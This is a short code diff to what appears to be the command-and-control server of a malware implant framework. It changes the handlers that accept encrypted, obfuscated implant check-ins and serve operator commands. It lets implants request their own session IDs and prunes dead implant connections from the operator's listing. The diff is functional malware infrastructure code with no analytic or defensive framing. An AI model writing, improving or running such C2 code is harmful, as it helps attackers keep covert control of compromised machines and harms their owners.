@@ -136,7 +136,8 @@ def _handle_implant(conn, addr):
         msg = json.loads(decrypt_message(deobfuscate(raw), priv_key).decode())
         info = msg.get("payload", {})
 
-        implant_id = "IMP-" + str(uuid.uuid4())[:4].upper()
+        requested_id = info.pop("implant_id", None)
+        implant_id = requested_id if requested_id and requested_id not in _sessions else "IMP-" + str(uuid.uuid4())[:4].upper()
         session = ImplantSession(implant_id, conn, priv_key, imp_pub, info)
 
         ack = {
@@ -214,6 +215,16 @@ def _handle_operator(conn, addr):
 
             if action == "LIST":
                 with _sessions_lock:
+                    dead = []
+                    for iid, s in list(_sessions.items()):
+                        try:
+                            s.conn.fileno()
+                            if s.conn.fileno() == -1:
+                                dead.append(iid)
+                        except Exception:
+                            dead.append(iid)
+                    for iid in dead:
+                        _sessions.pop(iid, None)
                     result = {
                         "status": "ok",
                         "implants": {iid: s.info for iid, s in _sessions.items()},
